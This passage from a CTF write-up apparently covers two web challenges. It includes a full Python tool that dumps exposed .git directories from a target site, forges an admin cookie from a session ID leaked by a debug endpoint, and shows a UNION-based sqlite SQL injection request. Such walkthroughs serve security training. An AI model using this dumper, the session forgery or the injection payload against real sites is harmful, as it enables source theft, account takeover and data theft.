<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">100644 Dockerfile�_��Tc���</span><br><span class="line">                          �`��� V�R100644 app.pyb��&#x27;spM�N�_t�#�1S�100644 requirements.txtz�2�K��p4��*��y(JD�N40000 staticl��0�����;Xx\��?�&amp;�40000 templates4W��eZ����I᏷���</span><br></pre></td></tr></table></figure>

<p>到这里就不太好看了，还是使用自动脚本好一点</p>
<p>使用ai融合了githack和gitdumper，使得爬下来的git结构和对象都比较完整：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用 SSL 警告</span></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置日志</span></span><br><span class="line">logging.basicConfig(<span class="built_in">format</span>=<span class="string">&#x27;[%(asctime)s] [%(levelname)s] %(message)s&#x27;</span>, datefmt=<span class="string">&#x27;%H:%M:%S&#x27;</span>, level=logging.INFO)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GitDigger</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url, dst, threads=<span class="number">10</span>, timeout=<span class="number">10</span>, retry=<span class="number">3</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.url = url.rstrip(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.url.endswith(<span class="string">&#x27;.git&#x27;</span>):</span><br><span class="line">            <span class="variable language_">self</span>.url += <span class="string">&#x27;/.git&#x27;</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.url.endswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">else</span> <span class="string">&#x27;.git&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.base_url = <span class="variable language_">self</span>.url[:-<span class="number">4</span>]</span><br><span class="line">        <span class="variable language_">self</span>.dst = dst</span><br><span class="line">        <span class="variable language_">self</span>.temp_dst = tempfile.mkdtemp()</span><br><span class="line">        <span class="variable language_">self</span>.threads = threads</span><br><span class="line">        <span class="variable language_">self</span>.timeout = timeout</span><br><span class="line">        <span class="variable language_">self</span>.retry = retry</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.q = queue.Queue()</span><br><span class="line">        <span class="variable language_">self</span>.processed_hashes = <span class="built_in">set</span>()</span><br><span class="line">        <span class="variable language_">self</span>.downloaded_paths = <span class="built_in">set</span>()</span><br><span class="line">        <span class="variable language_">self</span>.lock = threading.Lock()</span><br><span class="line">        <span class="variable language_">self</span>.stop_event = threading.Event()</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.stats = &#123;</span><br><span class="line">            <span class="string">&#x27;requests&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;downloaded&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;failed&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;objects_found&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.user_agents = [</span><br><span class="line">            <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 核心文件列表</span></span><br><span class="line">        <span class="variable language_">self</span>.common_files = [</span><br><span class="line">            <span class="string">&#x27;HEAD&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;packed-refs&#x27;</span>, <span class="string">&#x27;COMMIT_EDITMSG&#x27;</span>, <span class="string">&#x27;description&#x27;</span>, </span><br><span class="line">            <span class="string">&#x27;info/exclude&#x27;</span>, <span class="string">&#x27;info/refs&#x27;</span>, <span class="string">&#x27;objects/info/packs&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;logs/HEAD&#x27;</span>, </span><br><span class="line">            <span class="comment"># Stash 相关文件 (非常重要)</span></span><br><span class="line">            <span class="string">&#x27;refs/stash&#x27;</span>, <span class="string">&#x27;logs/refs/stash&#x27;</span>,</span><br><span class="line">            <span class="comment"># 常见分支</span></span><br><span class="line">            <span class="string">&#x27;logs/refs/heads/master&#x27;</span>, <span class="string">&#x27;logs/refs/heads/main&#x27;</span>, <span class="string">&#x27;logs/refs/heads/dev&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;refs/heads/master&#x27;</span>, <span class="string">&#x27;refs/heads/main&#x27;</span>, <span class="string">&#x27;refs/heads/dev&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;refs/remotes/origin/HEAD&#x27;</span>, <span class="string">&#x27;refs/remotes/origin/master&#x27;</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_header</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;User-Agent&quot;</span>: random.choice(<span class="variable language_">self</span>.user_agents)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        █▀▀ █ ▀█▀ █▀▄ █ █▀▀ █▀▀ █▀▀ █▀▄</span></span><br><span class="line"><span class="string">        █▄█ █  █  █▄▀ █ █▄█ █▄█ ██▄ █▀▄  v3.1 (Fix Stash)</span></span><br><span class="line"><span class="string">        -------------------------------------------</span></span><br><span class="line"><span class="string">        Target : <span class="subst">&#123;self.base_url&#125;</span></span></span><br><span class="line"><span class="string">        Output : <span class="subst">&#123;self.dst&#125;</span></span></span><br><span class="line"><span class="string">        Threads: <span class="subst">&#123;self.threads&#125;</span></span></span><br><span class="line"><span class="string">        -------------------------------------------</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        workers = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.threads):</span><br><span class="line">            t = threading.Thread(target=<span class="variable language_">self</span>.worker, daemon=<span class="literal">True</span>)</span><br><span class="line">            t.start()</span><br><span class="line">            workers.append(t)</span><br><span class="line"></span><br><span class="line">        logging.info(<span class="string">&quot;[Phase 1] Downloading core files...&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> <span class="variable language_">self</span>.common_files:</span><br><span class="line">            <span class="variable language_">self</span>.add_task(f)</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.q.join()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解析 Pack</span></span><br><span class="line">        <span class="variable language_">self</span>.parse_packs()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># [关键修复] 解析 Index, Logs 和 Stash</span></span><br><span class="line">        logging.info(<span class="string">&quot;[Phase 2] Parsing refs, logs and STASH...&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.scan_local_file(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.scan_local_file(<span class="string">&#x27;logs/HEAD&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.scan_local_file(<span class="string">&#x27;packed-refs&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 显式扫描 Stash 文件，提取其中的 Commit Hash</span></span><br><span class="line">        <span class="variable language_">self</span>.scan_local_file(<span class="string">&#x27;refs/stash&#x27;</span>)      <span class="comment"># 当前 Stash 指针</span></span><br><span class="line">        <span class="variable language_">self</span>.scan_local_file(<span class="string">&#x27;logs/refs/stash&#x27;</span>) <span class="comment"># 历史 Stash 记录</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 此时队列中应该增加了 Stash 对应的 Object，等待它们下载完成</span></span><br><span class="line">        <span class="variable language_">self</span>.q.join()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Git Fsck 循环</span></span><br><span class="line">        logging.info(<span class="string">&quot;[Phase 3] Deep scan with git fsck...&quot;</span>)</span><br><span class="line">        max_fsck_loops = <span class="number">5</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_fsck_loops):</span><br><span class="line">            found_new = <span class="variable language_">self</span>.run_git_fsck()</span><br><span class="line">            <span class="keyword">if</span> found_new:</span><br><span class="line">                logging.info(<span class="string">f&quot;--- Fsck Loop <span class="subst">&#123;i+<span class="number">1</span>&#125;</span> found new objects ---&quot;</span>)</span><br><span class="line">                <span class="variable language_">self</span>.q.join()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                logging.info(<span class="string">&quot;Git repository looks consistent.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.restore_repo()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_task</span>(<span class="params">self, path</span>):</span><br><span class="line">        <span class="keyword">if</span> path.startswith(<span class="string">&#x27;.git/&#x27;</span>): path = path[<span class="number">5</span>:]</span><br><span class="line">        <span class="keyword">with</span> <span class="variable language_">self</span>.lock:</span><br><span class="line">            <span class="keyword">if</span> path <span class="keyword">in</span> <span class="variable language_">self</span>.downloaded_paths: <span class="keyword">return</span></span><br><span class="line">            <span class="variable language_">self</span>.downloaded_paths.add(path)</span><br><span class="line">        <span class="variable language_">self</span>.q.put(path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_object_task</span>(<span class="params">self, sha1</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sha1 <span class="keyword">or</span> <span class="built_in">len</span>(sha1) != <span class="number">40</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">with</span> <span class="variable language_">self</span>.lock:</span><br><span class="line">            <span class="keyword">if</span> sha1 <span class="keyword">in</span> <span class="variable language_">self</span>.processed_hashes: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="variable language_">self</span>.processed_hashes.add(sha1)</span><br><span class="line">            <span class="variable language_">self</span>.stats[<span class="string">&#x27;objects_found&#x27;</span>] += <span class="number">1</span></span><br><span class="line">        <span class="variable language_">self</span>.add_task(<span class="string">f&quot;objects/<span class="subst">&#123;sha1[:<span class="number">2</span>]&#125;</span>/<span class="subst">&#123;sha1[<span class="number">2</span>:]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> <span class="variable language_">self</span>.stop_event.is_set():</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                path = <span class="variable language_">self</span>.q.get(timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">except</span> queue.Empty:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            url = <span class="string">f&quot;<span class="subst">&#123;self.url&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">            local_path = os.path.join(<span class="variable language_">self</span>.temp_dst, <span class="string">&#x27;.git&#x27;</span>, path.replace(<span class="string">&#x27;/&#x27;</span>, os.sep))</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="variable language_">self</span>.download_file(url, local_path)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                <span class="variable language_">self</span>.q.task_done()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">self, url, local_path</span>):</span><br><span class="line">        os.makedirs(os.path.dirname(local_path), exist_ok=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.retry):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> requests.get(url, headers=<span class="variable language_">self</span>._get_header(), verify=<span class="literal">False</span>, timeout=<span class="variable language_">self</span>.timeout, stream=<span class="literal">True</span>) <span class="keyword">as</span> r:</span><br><span class="line">                    <span class="variable language_">self</span>.stats[<span class="string">&#x27;requests&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                        chunk = <span class="built_in">next</span>(r.iter_content(<span class="number">64</span>), <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">                        <span class="keyword">if</span> <span class="string">b&#x27;&lt;html&#x27;</span> <span class="keyword">in</span> chunk.lower() <span class="keyword">or</span> <span class="string">b&#x27;&lt;!doctype&#x27;</span> <span class="keyword">in</span> chunk.lower():</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;index&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url <span class="keyword">and</span> <span class="string">&#x27;HEAD&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">                                <span class="variable language_">self</span>.stats[<span class="string">&#x27;failed&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                                <span class="keyword">return</span></span><br><span class="line">                        <span class="keyword">with</span> <span class="built_in">open</span>(local_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                            f.write(chunk)</span><br><span class="line">                            <span class="keyword">for</span> c <span class="keyword">in</span> r.iter_content(<span class="number">8192</span>):</span><br><span class="line">                                f.write(c)</span><br><span class="line">                        <span class="variable language_">self</span>.stats[<span class="string">&#x27;downloaded&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="comment"># 下载完立即尝试提取哈希</span></span><br><span class="line">                        <span class="variable language_">self</span>.extract_hashes_from_file(local_path)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">elif</span> r.status_code == <span class="number">404</span>:</span><br><span class="line">                        <span class="variable language_">self</span>.stats[<span class="string">&#x27;failed&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="variable language_">self</span>.stats[<span class="string">&#x27;failed&#x27;</span>] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_hashes_from_file</span>(<span class="params">self, filepath</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f: content = f.read()</span><br><span class="line">        <span class="keyword">except</span>: <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 尝试 zlib 解压</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;objects&#x27;</span> <span class="keyword">in</span> filepath <span class="keyword">and</span> <span class="string">&#x27;pack&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> filepath:</span><br><span class="line">            <span class="keyword">try</span>: content = zlib.decompress(content)</span><br><span class="line">            <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取 SHA1</span></span><br><span class="line">        hashes = re.findall(<span class="string">b&#x27;[a-f0-9]&#123;40&#125;&#x27;</span>, content)</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> hashes:</span><br><span class="line">            <span class="keyword">try</span>: <span class="variable language_">self</span>.add_object_task(h.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_packs</span>(<span class="params">self</span>):</span><br><span class="line">        pack_info_path = os.path.join(<span class="variable language_">self</span>.temp_dst, <span class="string">&#x27;.git&#x27;</span>, <span class="string">&#x27;objects&#x27;</span>, <span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;packs&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pack_info_path): <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(pack_info_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f: content = f.read()</span><br><span class="line">        pack_hashes = re.findall(<span class="string">b&#x27;pack-([a-f0-9]&#123;40&#125;).pack&#x27;</span>, content)</span><br><span class="line">        <span class="keyword">for</span> ph <span class="keyword">in</span> pack_hashes:</span><br><span class="line">            h = ph.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.add_task(<span class="string">f&quot;objects/pack/pack-<span class="subst">&#123;h&#125;</span>.idx&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.add_task(<span class="string">f&quot;objects/pack/pack-<span class="subst">&#123;h&#125;</span>.pack&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.q.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">scan_local_file</span>(<span class="params">self, relative_path</span>):</span><br><span class="line">        local_path = os.path.join(<span class="variable language_">self</span>.temp_dst, <span class="string">&#x27;.git&#x27;</span>, relative_path.replace(<span class="string">&#x27;/&#x27;</span>, os.sep))</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(local_path):</span><br><span class="line">            logging.info(<span class="string">f&quot;Scanning <span class="subst">&#123;relative_path&#125;</span> for hashes...&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.extract_hashes_from_file(local_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_git_fsck</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = [<span class="string">&#x27;git&#x27;</span>, <span class="string">&#x27;fsck&#x27;</span>, <span class="string">&#x27;--full&#x27;</span>]</span><br><span class="line">            result = subprocess.run(cmd, cwd=<span class="variable language_">self</span>.temp_dst, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">            output = result.stdout + result.stderr</span><br><span class="line">            missing_hashes = re.findall(<span class="string">b&#x27;missing [a-z]+ ([a-f0-9]&#123;40&#125;)&#x27;</span>, output)</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> missing_hashes:</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.add_object_task(h.decode(<span class="string">&#x27;utf-8&#x27;</span>)): count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> count &gt; <span class="number">0</span></span><br><span class="line">        <span class="keyword">except</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">restore_repo</span>(<span class="params">self</span>):</span><br><span class="line">        logging.info(<span class="string">&quot;Restoring repository...&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 1. 检查 Stash 是否存在</span></span><br><span class="line">        stash_ref = os.path.join(<span class="variable language_">self</span>.temp_dst, <span class="string">&#x27;.git&#x27;</span>, <span class="string">&#x27;refs&#x27;</span>, <span class="string">&#x27;stash&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(stash_ref):</span><br><span class="line">            logging.info(<span class="string">&quot;[+] Stash ref found! You should be able to run &#x27;git stash list&#x27; after restore.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 尝试 Reset</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            subprocess.run([<span class="string">&#x27;git&#x27;</span>, <span class="string">&#x27;checkout&#x27;</span>, <span class="string">&#x27;.&#x27;</span>], cwd=<span class="variable language_">self</span>.temp_dst, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)</span><br><span class="line">            logs_head = os.path.join(<span class="variable language_">self</span>.temp_dst, <span class="string">&#x27;.git&#x27;</span>, <span class="string">&#x27;logs&#x27;</span>, <span class="string">&#x27;HEAD&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(logs_head):</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(logs_head, <span class="string">&#x27;r&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    lines = f.readlines()</span><br><span class="line">                    <span class="keyword">if</span> lines:</span><br><span class="line">                        last_hash = lines[-<span class="number">1</span>].split()[<span class="number">1</span>]</span><br><span class="line">                        subprocess.run([<span class="string">&#x27;git&#x27;</span>, <span class="string">&#x27;reset&#x27;</span>, <span class="string">&#x27;--hard&#x27;</span>, last_hash], cwd=<span class="variable language_">self</span>.temp_dst, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">f&quot;Restore warning: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 复制结果</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="variable language_">self</span>.dst): shutil.rmtree(<span class="variable language_">self</span>.dst)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            shutil.copytree(<span class="variable language_">self</span>.temp_dst, <span class="variable language_">self</span>.dst)</span><br><span class="line">            logging.info(<span class="string">f&quot;Success! Repository saved to: <span class="subst">&#123;self.dst&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.print_stats()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 提示用户</span></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(os.path.join(<span class="variable language_">self</span>.dst, <span class="string">&#x27;.git&#x27;</span>, <span class="string">&#x27;refs&#x27;</span>, <span class="string">&#x27;stash&#x27;</span>)):</span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">&quot;\n[!] Important: STASH FOUND.&quot;</span>)</span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">f&quot;    Go to <span class="subst">&#123;self.dst&#125;</span> and run:&quot;</span>)</span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">&quot;    &gt; git stash list&quot;</span>)</span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">&quot;    &gt; git stash pop&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">f&quot;Failed to copy files: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>: shutil.rmtree(<span class="variable language_">self</span>.temp_dst)</span><br><span class="line">        <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_stats</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        -------------------------------------------</span></span><br><span class="line"><span class="string">        [Statistics]</span></span><br><span class="line"><span class="string">        Total Requests   : <span class="subst">&#123;self.stats[<span class="string">&#x27;requests&#x27;</span>]&#125;</span></span></span><br><span class="line"><span class="string">        Files Downloaded : <span class="subst">&#123;self.stats[<span class="string">&#x27;downloaded&#x27;</span>]&#125;</span></span></span><br><span class="line"><span class="string">        Objects Found    : <span class="subst">&#123;self.stats[<span class="string">&#x27;objects_found&#x27;</span>]&#125;</span></span></span><br><span class="line"><span class="string">        -------------------------------------------</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--threads&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">10</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    GitDigger(args.url, args.output, threads=args.threads).start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>这样直接gitk就可以看了，非常方便</p>
<p><img src="/2026/01/23/scarlet-ctf2026/gitk.png"></p>
<h3 id="Campus-One"><a href="#Campus-One" class="headerlink" title="Campus One"></a>Campus One</h3><h4 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h4><p>Access the admin panel and retrieve the hidden flag from the backend.</p>
<h4 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h4><p>这题主要考使用前端框架可能导致的接口泄露</p>
<p>可以在window的所有属性中查看到</p>
<p><img src="/2026/01/23/scarlet-ctf2026/cam0.png"></p>
<p>访问：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/v2/debug/sessions</span><br></pre></td></tr></table></figure>

<p>不通，那么尝试v1或者不加版本</p>
<p>最终找到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/debug/sessions</span><br></pre></td></tr></table></figure>

<p>响应：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;system_status&quot;:&quot;active&quot;,&quot;debug_mode&quot;:true,&quot;active_sessions&quot;:[&#123;&quot;sessionId&quot;:&quot;admin_session_44920_x8z&quot;,&quot;user&quot;:&quot;admin_root&quot;,&quot;role&quot;:&quot;administrator&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>之前扫目录时存在admin接口，</p>
<p>那么直接使用这个sessionId进行访问，</p>
<p>正常访问可看到cookie格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: session_id=guest_session_gq0l87j2ppu</span><br></pre></td></tr></table></figure>

<p>伪造：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: session_id=admin_session_44920_x8z</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<p><img src="/2026/01/23/scarlet-ctf2026/cam1.png"></p>
<p>search接口存在sql注入，测试后发现是sqllite：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/admin/search?q=&#x27;/**/union/**/select/**/sqlite_version(),2,3,4,5--+</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:3000/admin</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session_id=admin_session_44920_x8z</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>

<p>得到</p>
